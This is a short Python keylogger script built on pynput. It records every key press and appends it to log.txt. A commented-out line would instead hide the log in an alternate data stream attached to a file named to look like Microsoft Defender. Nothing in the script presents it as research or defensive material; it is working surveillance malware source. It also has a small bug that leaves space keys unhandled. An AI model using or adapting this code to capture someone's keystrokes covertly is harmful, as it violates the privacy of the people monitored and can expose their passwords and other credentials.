from fileinput import filename
from pynput.keyboard import Listener
# def evnt_key_press(key):
#     f = open('key.txt','a')
#     f.write(str(key).replace("'",'') + "\n" )
#     f.close()
# obj = Listener(on_press=evnt_key_press)
# obj.start()
# obj.join()

# filename="MicrosftDefender.exe:log.txt"
filename="log.txt"
def anonymous(key):
    key = str(key)
    key = key.replace("'","")
    if key== "Key.enter":
        key="\n"
    if key=="Key.space":
        key==" "
    with open(filename,"a") as file:
        file.write(key)

with Listener(on_press=anonymous) as listener:
    listener.join()